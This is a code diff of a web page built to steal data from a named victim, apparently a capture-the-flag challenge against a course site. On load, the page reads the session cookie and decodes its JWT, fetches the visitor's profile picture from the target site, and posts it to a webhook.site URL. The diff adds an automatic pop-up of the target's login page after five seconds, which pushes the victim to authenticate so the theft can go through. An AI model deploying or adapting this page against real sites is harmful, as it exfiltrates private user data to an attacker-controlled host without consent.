@@ -43,6 +43,7 @@
 <body>
     <h1>Profile Picture from p1</h1>
     <p>When you (Pepe) open this page, it will load your profile picture from p1 and send it to a webhook for capture.</p>
+    <p class="info">The login page for p1 will open automatically in 5 seconds to ensure a valid session. Please log in there if prompted.</p>
 
     <!-- Display the image -->
     <h2>Your Profile Picture</h2>
@@ -54,14 +55,15 @@
     <p>Below is the current session cookie for p1 (if available). A valid cookie should have a 'user_id' in the payload.</p>
     <pre id="cookie-info">Checking cookies...</pre>
 
-    <!-- Button to open login page -->
+    <!-- Button to open login page (manual fallback) -->
     <h2>Login to p1</h2>
-    <p>If the image doesn't load, you may need to log in to p1 to generate a valid session cookie with a user_id.</p>
-    <button onclick="window.open('https://chl-60d5b8fe-ad2b-4192-b170-f20940af90ab-imagen-importante.softwareseguro.com.ar/login', '_blank')">Log in to p1</button>
+    <p>If the image doesn't load or the automatic login fails, click here to log in to p1 manually.</p>
+    <button onclick="openLogin()">Log in to p1</button>
 
     <script>
         // Webhook URL
         const WEBHOOK_URL = 'https://webhook.site/7c2f9e76-5d32-4f1c-b61e-8de3af76eb97';
+        const LOGIN_URL = 'https://chl-60d5b8fe-ad2b-4192-b170-f20940af90ab-imagen-importante.softwareseguro.com.ar/login';
 
         // Function to decode JWT payload
         function decodeJWTPayload(jwt) {
@@ -96,8 +98,13 @@
             }
         }
 
+        // Function to open login page
+        function openLogin() {
+            window.open(LOGIN_URL, '_blank');
+        }
+
         // Function to send image to webhook
-        async function sendToWebhook(blob, filename = 'profile-pic.png') {
+        async function sendToWebhook(blob, filename = 'profile-pic-from-pepe.png') {
             const imageDisplay = document.getElementById('image-display');
             try {
                 const formData = new FormData();
@@ -136,7 +143,7 @@
 
                 if (!response.ok) {
                     if (response.status === 302) {
-                        imageDisplay.innerHTML = '<p class="error">Error: Redirected to login. The session cookie is invalid or missing. Please log in to p1 using the button below.</p>';
+                        imageDisplay.innerHTML = '<p class="error">Error: Redirected to login. The session cookie is invalid or missing. Please log in to p1 in the new tab that opened.</p>';
                     } else {
                         imageDisplay.innerHTML = `<p class="error">Error: Failed to load image (Status: ${response.status}).</p>`;
                     }
@@ -165,6 +172,11 @@
         window.onload = () => {
             checkCookies();
             loadProfilePicture();
+            // Automatically open login page after 5 seconds
+            setTimeout(() => {
+                openLogin();
+                document.getElementById('image-display').innerHTML += '<p class="info">Login page opened automatically. Please log in to p1 to load the image.</p>';
+            }, 5000);
         };
     </script>
 </body>
